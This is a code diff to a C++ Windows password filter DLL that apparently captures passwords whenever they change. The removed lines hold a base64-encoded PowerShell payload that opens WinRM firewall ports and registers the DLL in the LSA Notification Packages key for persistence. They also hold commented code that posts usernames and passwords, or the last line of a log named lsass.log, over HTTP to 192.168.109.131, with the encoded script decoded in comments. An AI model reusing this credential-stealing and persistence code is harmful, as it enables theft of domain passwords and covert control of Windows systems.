@@ -66,22 +66,6 @@ NTSTATUS SendToRemote(PUNICODE_STRING text){
     return 0;
 }
 
-//Does persistence things
-NTSTATUS justPersistenceThings(){
-    system("powershell.exe -EncodedCommand RQBuAGEAYgBsAGUALQBQAFMAUgBlAG0AbwB0AGkAbgBnADsAJABlAHgAaQBzAHQAaQBuAGcAUgB1AGwAZQAgAD0AIABHAGUAdAAtAE4AZQB0AEYAaQByAGUAdwBhAGwAbABSAHUAbABlACAALQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUAIAAiAFcAaQBuAGQAbwB3AHMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUwB1AGIAcwB5AHMAdABlAG0AIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA7AGkAZgAgACgALQBuAG8AdAAgACQAZQB4AGkAcwB0AGkAbgBnAFIAdQBsAGUAKQAgAHsATgBlAHcALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBOAGEAbQBlACAAIgBXAGkAbgBkAG8AdwBzACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFMAdQBiAHMAeQBzAHQAZQBtACIAIAAtAEQAaQByAGUAYwB0AGkAbwBuACAASQBuAGIAbwB1AG4AZAAgAC0ATABvAGMAYQBsAFAAbwByAHQAIAA1ADkAOAA1ACAALQBQAHIAbwB0AG8AYwBvAGwAIABUAEMAUAAgAC0AQQBjAHQAaQBvAG4AIABBAGwAbABvAHcAOwBOAGUAdwAtAE4AZQB0AEYAaQByAGUAdwBhAGwAbABSAHUAbABlACAALQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUAIAAiAFcAaQBuAGQAbwB3AHMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUwB1AGIAcwB5AHMAdABlAG0AIgAgAC0ARABpAHIAZQBjAHQAaQBvAG4AIABPAHUAdABiAG8AdQBuAGQAIAAtAEwAbwBjAGEAbABQAG8AcgB0ACAANQA5ADgANQAgAC0AUAByAG8AdABvAGMAbwBsACAAVABDAFAAIAAtAEEAYwB0AGkAbwBuACAAQQBsAGwAbwB3ADsATgBlAHcALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBOAGEAbQBlACAAIgBIAFQAVABQACAAbwB1AHQAIgAgAC0ARABpAHIAZQBjAHQAaQBvAG4AIABPAHUAdABiAG8AdQBuAGQAIAAtAEwAbwBjAGEAbABQAG8AcgB0ACAAOAAwACAALQBQAHIAbwB0AG8AYwBvAGwAIABUAEMAUAAgAC0AQQBjAHQAaQBvAG4AIABBAGwAbABvAHcAfQBSAGUAbQBvAHYAZQAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABMAHMAYQAiACAALQBOAGEAbQBlACAAIgBOAG8AdABpAGYAaQBjAGEAdABpAG8AbgAgAFAAYQBjAGsAYQBnAGUAcwAiADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABMAHMAYQAiACAALQBOAGEAbQBlACAAIgBOAG8AdABpAGYAaQBjAGEAdABpAG8AbgAgAFAAYQBjAGsAYQBnAGUAcwAiACAALQBWAGEAbAB1AGUAIAAiAHIAYQBzAHMAZgBtAGAAcgBgAG4AcwBjAGUAYwBsAGkAYAByAGAAbgBsAGkAYgBmAGkAbAB0AGUAcgAiACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAE0AdQBsAHQAaQBTAHQAcgBpAG4AZwA=");
-
-    // Enable-PSRemoting;
-    // $existingRule = Get-NetFirewallRule -DisplayName "Windows Cryptographic Subsystem" -ErrorAction SilentlyContinue;
-    // if (-not $existingRule) {
-    //      New-NetFirewallRule -DisplayName "Windows Cryptographic Subsystem" -Direction Inbound -LocalPort 5985 -Protocol TCP -Action Allow;
-    //      New-NetFirewallRule -DisplayName "Windows Cryptographic Subsystem" -Direction Outbound -LocalPort 5985 -Protocol TCP -Action Allow;
-    //      New-NetFirewallRule -DisplayName "HTTP out" -Direction Outbound -LocalPort 80 -Protocol TCP -Action Allow}
-    // Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "Notification Packages";
-    // New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "Notification Packages" -Value "rassfm`r`nscecli`r`nlibfilter" -PropertyType MultiString
-
-    return 0;
-}
-
 //Concatante two PUNICODE strings.
 //I really hope you like pointer silliness
 //because I don't
@@ -200,7 +184,6 @@ extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void) 
 //return FALSE to deny change, TRUE to accept
 //this function being called does not mean the change was successful
 extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING uname, PUNICODE_STRING legalName, PUNICODE_STRING password, BOOLEAN SetOperation){
-//    justPersistenceThings();
     return TRUE; //not going to actually prevent password changes right now
 }
 
@@ -239,61 +222,5 @@ extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICOD
     HeapFree(hHeap, 0, temp2);
     HeapFree(hHeap, 0, fullString);
     HeapDestroy(hHeap);
-
-//    free(temp1);
-//    free(temp2);
-//    free(fullString);
-
-//    //https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/
-//    HINTERNET hInternet = InternetOpen(reinterpret_cast<LPCSTR>(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-//    HINTERNET hSession = InternetConnect(hInternet, reinterpret_cast<LPCSTR>(L"192.168.109.131"), 80, NULL, NULL, INTERNET_SERVICE_HTTP , 0, 0);
-//    HINTERNET hReq = HttpOpenRequest(hSession, reinterpret_cast<LPCSTR>(L"POST"), reinterpret_cast<LPCSTR>(L"/post"), NULL, NULL, NULL, 0, 0);
-//    char* pBuf= (char *) "SomeData";
-//
-//    InternetSetOption(hSession,INTERNET_OPTION_USERNAME,uname->Buffer,uname->Length/2);
-//    InternetSetOption(hSession,INTERNET_OPTION_PASSWORD,password->Buffer,password->Length/2);
-//    HttpSendRequest(hReq,NULL,0,pBuf,strlen(pBuf));
-
-//    LPCSTR command = reinterpret_cast<LPCSTR>("powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABmAGkAbABlAFAAYQB0AGgAIAA9ACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGwAcwBhAHMAcwAuAGwAbwBnACIAOwAkAHMAZQByAHYAZQByAFUAcgBsACAAPQAgACIAMQA5ADIALgAxADYAOAAuADEAMAA5AC4AMQAzADEALwBwAG8AcwB0ACIAOwAkAGwAYQBzAHQATABpAG4AZQAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAGYAaQBsAGUAUABhAHQAaAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBMAGEAcwB0ACAAMQA7AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAHMAZQByAHYAZQByAFUAcgBsACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAEIAbwBkAHkAIAAkAGwAYQBzAHQATABpAG4AZQAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgB0AGUAeAB0AC8AcABsAGEAaQBuADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQAxADYAbABlACIACgA=");
-
-    //call the other executable for networking
-//    ShellExecute(NULL,
-//                 reinterpret_cast<LPCSTR>("open"),
-//                 reinterpret_cast<LPCSTR>("calc.exe"),
-//                 reinterpret_cast<LPCSTR>(""),
-//                 NULL,
-//                 SW_SHOWNORMAL
-//    );
-//    STARTUPINFO startupInfo;
-//    PROCESS_INFORMATION processInfo;
-//    ZeroMemory(&startupInfo, sizeof(startupInfo));
-//    startupInfo.cb = sizeof(startupInfo);
-//    ZeroMemory(&processInfo, sizeof(processInfo));
-//    const char* executablePath = "C:\\Windows\\System32\\calc.exe";
-//    CreateProcess(
-//            executablePath,     // Path to the executable
-//            NULL,               // Command line arguments (optional)
-//            NULL,               // Process handle not inheritable
-//            NULL,               // Thread handle not inheritable
-//            FALSE,              // Set handle inheritance to FALSE
-//            0,                  // No creation flags
-//            NULL,               // Use parent's environment block
-//            NULL,               // Use parent's starting directory
-//            &startupInfo,       // Pointer to STARTUPINFO structure
-//            &processInfo  // Pointer to PROCESS_INFORMATION structure
-//    );
-//
-//    WaitForSingleObject(processInfo.hProcess, 30000);
-//
-//    CloseHandle(processInfo.hProcess);
-//    CloseHandle(processInfo.hThread);
-
-    //above blob is this script
-    //$filePath = "C:\Windows\Temp\lsass.log"
-    //$serverUrl = "192.168.109.131/post"
-    //$lastLine = Get-Content -Path $filePath | Select-Object -Last 1
-    //Invoke-RestMethod -Uri $serverUrl -Method Post -Body $lastLine -ContentType "text/plain; charset=utf-16le"
-
-
     return 0;
 }
